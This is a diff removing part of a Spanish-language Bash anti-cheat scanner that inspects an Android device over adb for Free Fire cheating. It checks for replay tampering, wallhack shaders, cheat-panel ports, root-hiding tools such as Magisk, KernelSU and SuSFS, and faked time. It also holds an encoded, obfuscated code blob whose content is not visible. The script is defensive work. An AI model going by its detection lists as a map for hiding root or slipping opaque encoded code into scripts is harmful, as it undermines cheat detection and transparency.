-    CRITICAL_FOLDERS=("$GAME_DATA_DIR/files/contentcache" "$GAME_DATA_DIR/files/MReplays" "$GAME_DATA_DIR/cache" "$GAME_OBB_DIR")
-
-    # 'contentcache' es la única carpeta cuyo vaciado total es señal fuerte de limpieza de rastros.
-    # MReplays y cache se vacían solos por comportamiento normal (auto-borrado de replays viejos,
-    # limpieza de cache por Android bajo presión de almacenamiento) y el OBB ya casi no se usa en
-    # instalaciones actuales de Free Fire (los assets van por contentcache) — carpeta vacía o
-    # directamente ausente ahí es lo normal, no la excepción. Por eso ya no cuentan como sospechosas.
-    EMPTY_CHECK_FOLDERS=("$GAME_DATA_DIR/files/contentcache")
-
-    log_output "${B}[+] Verificando carpetas vacías sospechosas...${N}"
-    EMPTY_DETECTED=0
-    for folder in "${EMPTY_CHECK_FOLDERS[@]}"; do
-        if adb shell "[ -d '$folder' ]" 2>/dev/null; then
-            FILE_COUNT=$(adb shell "find '$folder' -type f 2>/dev/null | wc -l" | tr -d '\r')
-            if [ "$FILE_COUNT" -eq 0 ]; then
-                log_output "${R}[!] CARPETA VACÍA: $(basename "$folder")${N}"
-                EMPTY_DETECTED=1; ((SUSPICIOUS_COUNT+=2))
-            fi
-        fi
-    done
-    [ $EMPTY_DETECTED -eq 0 ] && log_output "${G}[✓] Todas las carpetas tienen archivos${N}"
-    echo ""
-
-    # MReplays y cache cambian de ctime todo el tiempo por uso normal del juego (autoguardado de
-    # replays al terminar cada partida, archivos temporales) — no es tampering, es la app funcionando.
-    # Solo vigilamos modificación reciente en carpetas que un jugador normal no debería tocar en medio
-    # de una partida. El análisis específico y más fino de MReplays ya lo hace check_replays().
-    MOD_CHECK_FOLDERS=("$GAME_DATA_DIR/files/contentcache" "$GAME_OBB_DIR")
-
-    log_output "${B}[+] Verificando modificaciones recientes en carpetas críticas...${N}"
-    MOD_FOUND=0
-    for folder in "${MOD_CHECK_FOLDERS[@]}"; do
-        if adb shell "[ -d '$folder' ]" 2>/dev/null; then
-            CHANGE_TIME=$(adb shell "stat '$folder' 2>/dev/null | grep 'Change:' | awk '{print \$2\" \"\$3}' | cut -d'.' -f1" | tr -d '\r')
-            if [ -n "$CHANGE_TIME" ]; then
-                CHANGE_EPOCH=$(date -d "$CHANGE_TIME" +%s 2>/dev/null || echo 0)
-                CURRENT_EPOCH=$(date +%s)
-                TIME_DIFF=$((CURRENT_EPOCH - CHANGE_EPOCH))
-                if [ $TIME_DIFF -lt 10800 ] && [ $TIME_DIFF -gt 0 ]; then
-                    HOURS_AGO=$((TIME_DIFF / 3600))
-                    MINS_AGO=$(((TIME_DIFF % 3600) / 60))
-                    log_output "${Y}[!] Modificada hace ${HOURS_AGO}h ${MINS_AGO}m: $(basename "$folder")${N}"
-                    MOD_FOUND=1; ((SUSPICIOUS_COUNT++))
-                fi
-            fi
-        fi
-    done
-    [ $MOD_FOUND -eq 0 ] && log_output "${G}[✓] Sin modificaciones recientes sospechosas${N}"
-    echo ""
-}
-
-check_replays() {
-    sec_hdr "ANÁLISIS DE REPLAYS"
-
-    for _wl in "${REPLAY_HWID_WHITELIST[@]}"; do
-        [ "$DEVICE_HWID" = "$_wl" ] && {
-            log_output "${B}[*] Dispositivo exento${N}"
-            echo ""; return 0
-        }
-    done
-
-    REPLAY_DIR="/sdcard/Android/data/$GAME_PKG/files/MReplays"
-    MOTIVOS=()
-
-    BINS_RAW=$(adb shell "ls -t '$REPLAY_DIR'/*.bin 2>/dev/null" | tr -d '\r')
-    if [ -z "$(echo "$BINS_RAW" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] Sin replays en MReplays${N}"
-        MOTIVOS+=("Sin archivos .bin en MReplays")
-        ((SUSPICIOUS_COUNT+=2))
-    else
-        TOTAL_BINS=$(echo "$BINS_RAW" | wc -l | tr -d ' ')
-        log_output "${B}[*] Replays encontrados: $TOTAL_BINS${N}"
-
-        NEWEST=$(echo "$BINS_RAW" | head -1)
-        NEWEST_SIZE=$(adb shell "du -k '$NEWEST' 2>/dev/null | cut -f1" | tr -d '\r ')
-        [ -n "$NEWEST_SIZE" ] && [ "$NEWEST_SIZE" -gt 0 ] 2>/dev/null && {
-            log_output "${B}[*] Replay más reciente: $(basename "$NEWEST") (${NEWEST_SIZE}KB)${N}"
-        }
-        NEWEST_STAT=$(adb shell "stat '$NEWEST' 2>/dev/null" | tr -d '\r')
-        NEWEST_ATIME=$(echo "$NEWEST_STAT" | grep "^Access:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-        NEWEST_MTIME=$(echo "$NEWEST_STAT" | grep "^Modify:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-        NEWEST_CTIME=$(echo "$NEWEST_STAT" | grep "^Change:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-        [ -n "$NEWEST_ATIME" ] && log_output "${B}    access: $NEWEST_ATIME  |  modify: $NEWEST_MTIME  |  change: $NEWEST_CTIME${N}"
-        if _null_nanos "$NEWEST_STAT"; then
-            log_output "${R}[!] Nanosegundos artificiales en timestamp de replay: $(basename "$NEWEST")${N}"
-            _ctx "Franja de nanosegundos con patrón repetido (0000/9999) — típico de touch/cp reescribiendo el timestamp, no del autoguardado orgánico del juego"
-            MOTIVOS+=("Timestamp de replay con nanosegundos artificiales")
-            ((SUSPICIOUS_COUNT+=2))
-        fi
-        # No sumar como sospechoso si el replay fue guardado hace menos de 10 minutos (partida recién terminada)
-        NEWEST_AGE=$(adb shell "find '$REPLAY_DIR' -name '*.bin' -newer '/proc/uptime' -mmin -10 2>/dev/null | wc -l" | tr -d '\r ')
-        if [ "${NEWEST_AGE:-0}" -gt 0 ] 2>/dev/null; then
-            log_output "${B}[*] Replay guardado recientemente — normal al finalizar partida${N}"
-        fi
-
-        OLDEST=$(echo "$BINS_RAW" | tail -1)
-        log_output "${B}[*] Replay más antiguo: $(basename "$OLDEST")${N}"
-    fi
-
-    PARTS_CMD=$(adb shell "logcat -d -t 200 2>/dev/null | grep -iE 'store1.*pull.*PARTS|pull.*PARTS=|PARTS.*pull'" | tr -d '\r' | grep -vE 'adbd|logcat|adb shell' | head -3)
-    if [ -n "$PARTS_CMD" ]; then
-        log_output "${R}[!] Comando de extracción de replay detectado:${N}"
-        echo "$PARTS_CMD" | while read -r l; do log_output "${Y}  $l${N}"; done
-        MOTIVOS+=("Extracción ADB pull PARTS= detectada")
-        ((SUSPICIOUS_COUNT+=5))
-    fi
-
-    SUSP_PORTS=$(adb shell "ss -tnp 2>/dev/null | grep -E ':8060|:8061|:8062|:8888|:8889|:9090|:9091'" | tr -d '\r' | head -5)
-    if [ -n "$SUSP_PORTS" ]; then
-        log_output "${R}[!] Puerto de panel de cheats activo:${N}"
-        _ctx "Puertos 8060-9091 son usados por paneles web de control de cheats para Free Fire — confirma panel activo durante la partida"
-        echo "$SUSP_PORTS" | while read -r l; do log_output "${Y}  $l${N}"; done
-        MOTIVOS+=("Panel remoto en puertos 8060-9091")
-        ((SUSPICIOUS_COUNT+=5))
-    fi
-
-    KERNEL_VER=$(adb shell "uname -r 2>/dev/null" | tr -d '\r')
-    for KBAD in "sultanlychee" "arter97" "kali" "nethunter"; do
-        if echo "$KERNEL_VER" | grep -qi "$KBAD"; then
-            log_output "${R}[!] Kernel de replay/root detectado: $KERNEL_VER${N}"
-            MOTIVOS+=("Kernel sospechoso: $KBAD")
-            ((SUSPICIOUS_COUNT+=4))
-        fi
-    done
-
-    SCRCPY_PROC=$(echo "$PS_CACHE" | grep -i "scrcpy" | grep -v "grep")
-    if [ -n "$SCRCPY_PROC" ]; then
-        log_output "${R}[!] scrcpy activo (espejamiento de pantalla para replay):${N}"
-        echo "$SCRCPY_PROC" | while read -r l; do log_output "${Y}  $l${N}"; done
-        MOTIVOS+=("scrcpy activo durante la partida")
-        ((SUSPICIOUS_COUNT+=3))
-    fi
-
-    if [ ${#MOTIVOS[@]} -gt 0 ]; then
-        echo ""
-        log_output "${R}[!] Motivos de sospecha (${#MOTIVOS[@]}):${N}"
-        for m in "${MOTIVOS[@]}"; do log_output "${Y}  • $m${N}"; done
-    else
-        log_output "${G}[✓] Sin indicadores de manipulación de replays${N}"
-    fi
-    echo ""
-}
-check_wallhack_bypass() {
-    sec_hdr "WALLHACK / SHADERS / OVERLAYS"
-    FOUND_WH=0
-
-    log_output "${B}[+] Verificando shaders en contentcache (firma UnityFS)...${N}"
-    SHADER_DIR="/sdcard/Android/data/$GAME_PKG/files/contentcache/Optional/android/gameassetbundles"
-    SHADERS=""
-    local _shader_cp
-    _shader_cp=$(adb shell "content query --uri content://media/external/file \
-        --projection _data \
-        --where \"_data LIKE '%$GAME_PKG%shader%'\""  2>/dev/null         | grep "_data=" | sed "s/.*_data=//" | tr -d "\r" | head -3)
-    if [ -n "$_shader_cp" ]; then
-        SHADERS="$_shader_cp"
-    else
-        SHADERS=$(adb shell "find '$SHADER_DIR' -name 'shader*' 2>/dev/null" | tr -d '\r' | head -3)
-    fi
-    if [ -n "$(echo "$SHADERS" | tr -d '[:space:]')" ]; then
-        echo "$SHADERS" | while read -r shader; do
-            [ -z "$shader" ] && continue
-            UNITY=$(adb shell "head -c 7 '$shader' 2>/dev/null" | tr -d '\r\n\000' | head -c 7)
-            if [ "$UNITY" != "UnityFS" ]; then
-                log_output "${R}[!] SHADER INVÁLIDO (firma incorrecta): $(basename "$shader")${N}"
-                _ctx "Shader sin firma UnityFS indica reemplazo de archivo — wallhack o ESP visual activo"
-                ((SUSPICIOUS_COUNT+=3)); FOUND_WH=1
-            else
-                log_output "${G}[✓] Shader verificado: firma UnityFS válida${N}"
-            fi
-            SHSTAT=$(adb shell "stat '$shader' 2>/dev/null" | tr -d '\r')
-            if _null_nanos "$SHSTAT"; then
-                log_output "${R}[!] Nanosegundos artificiales en timestamp de shader: $(basename "$shader")${N}"
-                _ctx "Franja de nanosegundos con patrón repetido (0000/9999) — típico de touch/cp reescribiendo el timestamp, no de una escritura orgánica del juego"
-                ((SUSPICIOUS_COUNT+=2)); FOUND_WH=1
-            fi
-            SHPERM=$(echo "$SHSTAT" | grep -oE '\([0-7]{3,4}/' | tr -d '(/')
-            SHATIME=$(echo "$SHSTAT" | grep "^Access:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-            SHMTIME=$(echo "$SHSTAT" | grep "^Modify:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-            SHCTIME=$(echo "$SHSTAT" | grep "^Change:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-            [ -n "$SHPERM" ] && log_output "${B}    permisos: $SHPERM  |  access: $SHATIME  |  modify: $SHMTIME  |  change: $SHCTIME${N}"
-        done
-    else
-        log_output "${Y}[*] Shaders contentcache: sin acceso o no presentes${N}"
-    fi
-
-    log_output "${B}[+] Verificando overlays por nombre de color...${N}"
-    local _overlay_access=0
-    for shader in branco verde ciano laranja amarelo magenta cinza preto azul; do
-        NAMED=$(adb shell "content query --uri content://media/external/file \
-            --projection _data \
-            --where \"_data LIKE '%$GAME_PKG%${shader}%'\""  2>/dev/null             | grep "_data=" | sed "s/.*_data=//" | tr -d "\r" | head -1)
-        if [ -z "$NAMED" ]; then
-            NAMED=$(adb shell "find /sdcard/Android/data/$GAME_PKG -name '*${shader}*' 2>/dev/null | head -1"                 | tr -d "\r")
-        fi
-        if [ -n "$(echo "$NAMED" | tr -d '[:space:]')" ]; then
-            log_output "${R}[!] OVERLAY/SHADER POR NOMBRE DETECTADO: $(basename "$NAMED") (patrón: $shader)${N}"
-            _ctx "Overlays con nombres de colores son shaders de wallhack conocidos — permiten ver enemigos a través de paredes"
-            ((SUSPICIOUS_COUNT+=3)); FOUND_WH=1; _overlay_access=1
-        fi
-    done
-    [ $_overlay_access -eq 0 ] && log_output "${Y}[*] Overlays por nombre: sin coincidencias${N}"
-
-    log_output "${B}[+] Verificando overlays en /sdcard raíz...${N}"
-    SDCARD_OVL=$(adb shell "ls /sdcard/ 2>/dev/null | grep -iE 'overlay|shader|Overlay'" | tr -d '\r')
-    if [ -n "$(echo "$SDCARD_OVL" | tr -d '[:space:]')" ]; then
-        log_output "${R}[!] ARCHIVOS DE OVERLAY EN /sdcard:${N}"
-        echo "$SDCARD_OVL" | while read -r f; do [ -n "$f" ] && log_output "${Y}  /sdcard/$f${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); FOUND_WH=1
-    fi
-
-    [ $FOUND_WH -eq 0 ] && log_output "${G}[✓] Sin shaders ni overlays sospechosos${N}"
-    echo ""
-}
-
-check_obb() {
-    log_output "${B}[+] Verificando OBB (AssetBundles UnityFS)...${N}"
-
-    local _obb_path=""
-    _obb_path=$(adb shell "content query --uri content://media/external/file         --projection _data         --where \"_data LIKE '%$GAME_PKG%.obb'\""  2>/dev/null         | grep "_data=" | sed "s/.*_data=//" | tr -d "\r" | head -1)
-
-    if [ -z "$(echo "$_obb_path" | tr -d "[:space:]")" ]; then
-        _obb_path=$(adb shell "ls /sdcard/Android/obb/$GAME_PKG/*.obb 2>/dev/null | head -1"             | tr -d "\r")
-    fi
-
-    if [ -z "$(echo "$_obb_path" | tr -d "[:space:]")" ]; then
-        log_output "${Y}[*] OBB: Sin acceso (Android 11+ restricción o juego no instalado — omitido)${N}"
-        echo ""; return
-    fi
-
-    log_output "${B}[*] OBB: $(basename "$_obb_path")${N}"
-
-    local _obb_stat
-    _obb_stat=$(adb shell "stat '$_obb_path' 2>/dev/null" | tr -d '\r')
-    if _null_nanos "$_obb_stat"; then
-        log_output "${R}[!] Nanosegundos artificiales en timestamp del OBB${N}"
-        _ctx "Franja de nanosegundos con patrón repetido (0000/9999) — típico de touch/cp reescribiendo el timestamp, no de la instalación orgánica del juego"
-        ((SUSPICIOUS_COUNT+=2)); FOUND_WH=1
-    fi
-
-    local _unity_count
-    _unity_count=$(adb shell "grep -ao 'UnityFS' \"$_obb_path\" 2>/dev/null | wc -l"         | tr -d "[:space:]\r")
-
-    if [ -z "$_unity_count" ] || ! echo "$_unity_count" | grep -qE '^[0-9]+$'; then
-        log_output "${Y}[*] OBB: No se pudo analizar contenido interno${N}"
-        echo ""; return
-    fi
-
-    if   [ "$_unity_count" -ge 10 ]; then
-        log_output "${G}[✓] OBB íntegro: $_unity_count AssetBundles UnityFS verificados${N}"
-    elif [ "$_unity_count" -ge 1 ]; then
-        log_output "${R}[!] OBB SOSPECHOSO: solo $_unity_count firma(s) UnityFS — assets reemplazados parcialmente${N}"
-        _ctx "Reemplazo parcial indica modificación quirúrgica de assets específicos — ESP de personajes o ítems"
-        ((SUSPICIOUS_COUNT+=3)); FOUND_WH=1
-    else
-        log_output "${R}[!] OBB MODIFICADO: 0 firmas UnityFS — todos los assets reemplazados (shader/wallhack)${N}"
-        _ctx "OBB completamente modificado = wallhack completo en funcionamiento — alta prioridad de ban"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_WH=1
-    fi
-    echo ""
-}
-
-check_apk_integrity() {
-    sec_hdr "INTEGRIDAD DEL APK / HASH SHA256"
-    APK_PATH=$(adb shell "pm path $GAME_PKG 2>/dev/null | head -1" | tr -d '\r' | sed 's/^package://')
-    if [ -z "$(echo "$APK_PATH" | tr -d '[:space:]')" ]; then
-        log_output "${Y}[*] No se pudo obtener el path del APK${N}"
-        echo ""; return
-    fi
-
-    log_output "${B}[*] APK path: ${W}$APK_PATH${N}"
-    log_output "${B}[+] Calculando SHA256 (puede tardar unos segundos)...${N}"
-    APK_SHA=$(adb shell "sha256sum '$APK_PATH' 2>/dev/null | awk '{print \$1}'" | tr -d '\r\n')
-
-    if [ -n "$APK_SHA" ] && [ ${#APK_SHA} -eq 64 ]; then
-        log_output "${B}[*] SHA256: ${W}$APK_SHA${N}"
-        if echo "$APK_SHA" | grep -qE '^0{64}$'; then
-            log_output "${R}[!] SHA256 inválido (todo ceros) — posible error de lectura${N}"
-            ((SUSPICIOUS_COUNT++))
-        else
-            log_output "${G}[✓] SHA256 calculado correctamente${N}"
-        fi
-    else
-        log_output "${Y}[*] No se pudo calcular SHA256${N}"
-    fi
-    echo ""
-}
-
-_d '=0nCiICIvh2YlBCIgAiCi0nT7RybkFGdjVGdlRGIn5War92boBibpNFIdNJnivVfHtHJiACd1BHd192Xn9GbgYiJg0FIwAScl1CIL90TI9FROV1TGRCIbBCIgAiCKkmZgACIgoQM9s0TPh0XE5UVPZEI7kSKz0zKU5UVPN0XTV1TJNUSQNVVThCKgACIgACIgAiCi0nT7RyQWN1XVtUValESTRCI682clN2byBFIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIDZ1UfV1SVpVSINFJiAibtAyWgACIgACIgAiCi0nT7RSVLVlWJh0UkAiOldWYrNWYQBCI9l1ekICI0VHc0V3bfd2bsBiJmASXgISVLVlWJh0UkICIu1CIbBCIgACIgACIKISfOtHJ6kCdv9mcg4WazBycvl2ZlxWa2lmcwBSZkBSYkFGbhN2clhCIPRUQUNURUVERgU1SVpVSINFIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIiMkVT9VVLVlWJh0UkICIu1CIbBCf8BSXgISVLVlWJh0UkICIu1CIbBiZpBCIgAiCpcSdrVneph2cnASatACclJ3ZgwHIiUESDF0QfNFUkICIvh2YlhCJ9MkVT9VVLVlWJh0UgACIgoQKnU3a1pXaoN3Jgk' 'WLgAXZydGI8BiIFh0QBN0XHtEUkICIvh2YlhCJ9U1SVpVSINFIgACIKISfOtHJu4iLpM3bpdWZslmdpJHcgUGZgEGZhxWYjNXZoASdrVneph2Ug8GZuF2YpZWayVmVg01Kb1nQ7RiIgQXdwRXdv91ZvxGIgACIKoQamBCIgAiCx0zSP9ESfRkTV9kRgsTKpMTPrQlTV90QfNVVPl0QJB1UVNFKoACIgACIgACIKUmbvRGI7ISfOtHJwRCIg0XW7RiIgQXdwRXdv91ZvxGImYCIdBiIwRiIg4WLgsFIvRGI7AHIy1CIkFWZyBSZslGa3BCfgIySP9ESfd0SQRiIg8GajVGIgACIgACIgogI950ekozTEFETBR1UOlEIH5USL90TIBSREBSRUVUVRFEUg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgIySP9ESfd0SQRiIg4WLgsFImlGIgACIKkyJyVGcwFmc3RWZz9GczxGfkV2cvB3csRWZrNWYyNGfkV2cvB3csxHajRXYwNHbnASRp1CIwVmcnBCfgISRINUQD91RLBFJiAyboNWZoQSPL90TI91RLBFIgACIKISfOtHJu4iLyVGcwFmc3ByLg8GZhV2ajFmcjBCZlN3bQNFTg8CIoNGdhB1UMBybk5WY' 'jlmZpJXZWBSXrsVfCtHJiACd1BHd192Xn9GbgACIgogCpZGIgACIKETPL90TI9FROV1TGByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgoQZu9GZgsjI950ekYGJgASfZtHJiACd1BHd192Xn9GbgYiJg0FIiYGJiAibtAyWg8GZgsjZgIXLgQWYlJHIlxWaodHI8BiITVETJZ0XL90TIRiIg8GajVGIgACIgACIgogI950ekozROl0SP9ESgUERgM1TWlESDJVQg0VIb1nU7RiIgQXdwRXdv91ZvxGIgACIgACIgogblhGdgsTXgISKn0lOlNWYwNnObdCIk1CIyRHI8BiITVETJZ0XL90TIRiIg8GajVGKkICIu1CIbBiZpBCIgAiCpciccdCIk1CIyRHI8BiIwETLgQWYlhGI8ByJ49mbrdCI21CIwVmcnBCfgcSdylmcvwHajRXYwNHbvwHZlN3bwNHbvwHZlN3bwh3L8FGZpJnZvcCIFlWLgAXZydGI8BCbsVnbvYXZk9iPyASblR3c5N3LgEGdhR2LgQmbpZmIgwGblh2cgIGZhhCJ9MVRMlkRft0TPhEIgACIKISfOtHJu4iLn5War92boBSZkBycvZXaoNmchBybk5WYjlmZpJXZWBSXrsVfCtHJiACd1B' 'Hd192Xn9GbgACIgogCpZGIgACIKETPL90TI9FROV1TGByOpkyM9sCVOV1TD91UV9USDlEUTV1UogCIgACIgACIgoQZu9GZgsjI950ekUmbpxGJgASfZtHJiACd1BHd192Xn9Gbg8GZgsTZulGbgIXLgQWYlJHIlxWaodHI8BiID9kUQ91SP9ESkICIvh2YlBCIgACIgACIKISfOtHJ68kVJR1QBByROl0SP9ESgUERg80UFN0TSBFIdFyW9J1ekICI0VHc0V3bfd2bsBCIgACIgACIK4WZoRHI70FIiM0TSB1XL90TIRiIg4WLgsFImlGIgACIKkyJ1tWd6lGazxXdylmc8t2cpdWe6xHajRXYwNHb8RWZz9GczxGfkV2cvBHe8FGZpJnZnASRp1CIwVmcnBCfgISRINUQD91UQRiIg8GajVGKk0zQPJFUft0TPhEIgACIKISfOtHJu4iLn5War92boBSZkBycvNXZj9mcwBybk5WYjlmZpJXZWBSXrsVfCtHJiACd1BHd192Xn9GbgACIgogCw0zSP9ESfRkTV9kRgACIgogI0NWZq5WSg8CI1tWd6lGaTByLgQWZz9GUTxEIvACZlN3bwhFIvASYklmcGBiOH5USL90TIJCIyRGafNWZzBCIgAiC7BSKoM3av9Gaft2Ylh2Y'
-
-check_root_bypass() {
-    sec_hdr "ROOT AVANZADO / MAGISK / SHAMIKO / ZYGISK"
-    log_output "${B}[+] Verificando Magisk, Shamiko, Zygisk...${N}"
-    BYPASS_FOUND=0
-
-    BYPASS_PS=$(echo "$PS_CACHE" | grep -iE 'magisk|shamiko|zygisk|busybox' | grep -viE 'knox')
-    if [ -n "$BYPASS_PS" ]; then
-        log_output "${R}[!] ROOT BYPASS DETECTADO (proceso)${N}"
-        _ctx "Procesos de gestión de root activos — pueden ocultar root a Free Fire vía denylist/Shamiko"
-        echo "$BYPASS_PS" | while read -r line; do log_output "${Y}  $line${N}"; done
-        ((SUSPICIOUS_COUNT+=3)); BYPASS_FOUND=1
-    fi
-
-    MAGISK_FILES=$(adb shell "ls /data/adb/magisk 2>/dev/null" | tr -d '\r')
-    if [ -n "$MAGISK_FILES" ]; then
-        log_output "${R}[!] MAGISK DETECTADO (/data/adb/magisk existe)${N}"
-        _ctx "Magisk habilita módulos como Shamiko/Zygisk que ocultan root de las detecciones del juego"
-        ((SUSPICIOUS_COUNT+=3)); BYPASS_FOUND=1
-    fi
-
-    APATCH_FILES=$(adb shell "ls /data/adb/apatch 2>/dev/null && echo found" | tr -d '\r')
-    if echo "$APATCH_FILES" | grep -q "found"; then
-        log_output "${R}[!] APATCH DETECTADO (/data/adb/apatch existe)${N}"
-        _ctx "APatch parchea el kernel directamente — root más difícil de detectar que Magisk"
-        ((SUSPICIOUS_COUNT+=3)); BYPASS_FOUND=1
-    fi
-
-    KSU_BIN=$(adb shell "ksud --version 2>/dev/null | head -1" | tr -d '\r')
-    KSU_DIR=$(adb shell "ls /data/adb/ksu 2>/dev/null && echo found" | tr -d '\r')
-    if [ -n "$KSU_BIN" ] || echo "$KSU_DIR" | grep -q "found"; then
-        log_output "${R}[!] KERNELSU DETECTADO${N}"
-        _ctx "KernelSU implementa root a nivel de syscall — omite detecciones de userspace como IntegrityAPI"
-        [ -n "$KSU_BIN" ] && log_output "${Y}  ksud: $KSU_BIN${N}"
-        ((SUSPICIOUS_COUNT+=3)); BYPASS_FOUND=1
-    fi
-
-    KSUNEXT_DIR=$(adb shell "ls /data/adb/ksunext 2>/dev/null && echo found" | tr -d '\r')
-    if echo "$KSUNEXT_DIR" | grep -q "found"; then
-        log_output "${R}[!] KERNELSU NEXT DETECTADO (/data/adb/ksunext)${N}"
-        _ctx "KernelSU Next = fork con soporte GKI más amplio — uso creciente en FF-cheaters 2024/25"
-        ((SUSPICIOUS_COUNT+=3)); BYPASS_FOUND=1
-    fi
-
-    [ $BYPASS_FOUND -eq 0 ] && log_output "${G}[✓] Sin root bypass avanzado${N}"
-    echo ""
-}
-check_susfs() {
-    sec_hdr "SUSFS — OCULTAMIENTO DE ROOT A NIVEL KERNEL"
-    FOUND_SUSFS=0
-
-    SUSFS_PROC=$(adb shell "test -d /proc/sys/fs/susfs && echo FOUND" 2>/dev/null | tr -d '\r')
-    if [ "$SUSFS_PROC" = "FOUND" ]; then
-        log_output "${R}[!] SuSFS detectado en /proc/sys/fs/susfs${N}"
-        _ctx "SuSFS oculta montajes y paths a nivel de kernel — Free Fire no puede ver /data/adb ni módulos"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_SUSFS=1
-    fi
-
-    SUSFS_SYS=$(adb shell "test -d /sys/kernel/security/susfs && echo FOUND" 2>/dev/null | tr -d '\r')
-    if [ "$SUSFS_SYS" = "FOUND" ]; then
-        log_output "${R}[!] SuSFS detectado en /sys/kernel/security/susfs${N}"
-        _ctx "Entry en securityfs confirma SuSFS compilado en el kernel — evasión total de detección de montajes"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_SUSFS=1
-    fi
-
-    SUSFS_FS=$(adb shell "cat /proc/filesystems 2>/dev/null | grep -i susfs" | tr -d '\r')
-    if [ -n "$SUSFS_FS" ]; then
-        log_output "${R}[!] SuSFS en filesystems del kernel: $SUSFS_FS${N}"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_SUSFS=1
-    fi
-
-    SUSFS_KERN=$(adb shell "uname -r 2>/dev/null | grep -i susfs" | tr -d '\r')
-    if [ -n "$SUSFS_KERN" ]; then
-        log_output "${R}[!] Kernel con SuSFS compilado: $SUSFS_KERN${N}"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_SUSFS=1
-    fi
-
-    SUSFS_KMOD=$(adb shell "grep -i susfs /proc/modules 2>/dev/null | head -3" | tr -d '\r')
-    if [ -n "$SUSFS_KMOD" ]; then
-        log_output "${R}[!] Módulo SuSFS cargado: $SUSFS_KMOD${N}"
-        ((SUSPICIOUS_COUNT+=5)); FOUND_SUSFS=1
-    fi
-
-    [ $FOUND_SUSFS -eq 0 ] && log_output "${G}[✓] SuSFS no detectado${N}"
-    echo ""
-}
-
-check_fake_time() {
-    sec_hdr "DETECCIÓN DE TIEMPO FALSO / CONGELADO"
-    log_output "${B}[+] Midiendo progresión del tiempo (3 muestras)...${N}"
-    T1=$(adb shell "date +%s 2>/dev/null" | tr -d '\r')
-    sleep 2
-    T2=$(adb shell "date +%s 2>/dev/null" | tr -d '\r')
-    sleep 2
-    T3=$(adb shell "date +%s 2>/dev/null" | tr -d '\r')
-
-    if [ -n "$T1" ] && [ -n "$T2" ] && [ -n "$T3" ]; then
-        D1=$((T2 - T1))
-        D2=$((T3 - T2))
-        log_output "${B}[*] Intervalo 1: ${W}${D1}s${N}  |  Intervalo 2: ${W}${D2}s${N}"
-        TIEMPO_OK=1
-        [ "$D1" -lt 1 ] && { log_output "${R}[!] TIEMPO CONGELADO — no avanzó entre muestra 1 y 2${N}"; _ctx "Tiempo congelado = fake time activo — impide registros de logcat con timestamps reales"; ((SUSPICIOUS_COUNT+=3)); TIEMPO_OK=0; FAKE_TIME_DETECTED=1; }
-        [ "$D2" -lt 1 ] && { log_output "${R}[!] TIEMPO CONGELADO — no avanzó entre muestra 2 y 3${N}"; _ctx "Tiempo congelado persistente confirma hook sobre clock_gettime o manipulación de RTC"; ((SUSPICIOUS_COUNT+=3)); TIEMPO_OK=0; FAKE_TIME_DETECTED=1; }
-        SALTO=$(( D1 > D2 ? D1 - D2 : D2 - D1 ))
-        if [ "$SALTO" -gt 3 ] && [ $TIEMPO_OK -eq 1 ] 2>/dev/null; then
-            log_output "${R}[!] SALTO DE TIEMPO IRREGULAR: diferencia de ${SALTO}s entre intervalos${N}"
-            _ctx "Saltos de tiempo irregulares sugieren manipulación selectiva del reloj para evitar detección por timing"
-            ((SUSPICIOUS_COUNT+=2))
-        elif [ $TIEMPO_OK -eq 1 ]; then
-            log_output "${G}[✓] Tiempo avanza normalmente y de forma consistente${N}"
-        fi
-    fi
-
-    log_output "${B}[+] Verificando coherencia de timestamps via stat...${N}"
-    TEST_FILE="/data/local/tmp/.tc_$$"
-    adb shell "echo test > $TEST_FILE 2>/dev/null" >/dev/null 2>&1
-    sleep 1
-    STAT_R1=$(adb shell "stat $TEST_FILE 2>/dev/null" | tr -d '\r')
-    sleep 2
-    STAT_R2=$(adb shell "stat $TEST_FILE 2>/dev/null" | tr -d '\r')
-    adb shell "rm -f $TEST_FILE 2>/dev/null" >/dev/null 2>&1
-
-    ATIME1=$(echo "$STAT_R1" | grep "^Access:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-    ATIME2=$(echo "$STAT_R2" | grep "^Access:" | grep -oE '[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}' | head -1)
-    if echo "$STAT_R1" | grep -q "1970"; then
-        log_output "${R}[!] INCONSISTENCIA CRÍTICA: stat muestra año 1970${N}"; ((SUSPICIOUS_COUNT+=2))
-    elif [ -n "$ATIME1" ] && [ "$ATIME1" = "$ATIME2" ]; then
-        log_output "${B}[*] ATIME estatico (normal en muchos dispositivos)${N}"
-    else
-        log_output "${G}[✓] Timestamps coherentes entre lecturas${N}"
-    fi
-    echo ""
-}
-
-check_tooling() {
-    sec_hdr "HERRAMIENTAS SOSPECHOSAS / EMULADOR"
-    log_output "${B}[+] Verificando emuladores y herramientas sospechosas...${N}"
-    TOOL_FOUND=0
-    STRONG_SIGNAL=0
-
-    # NOTA: la extracción original '\[.*\]$' era avara y se comía las DOS parejas de corchetes de
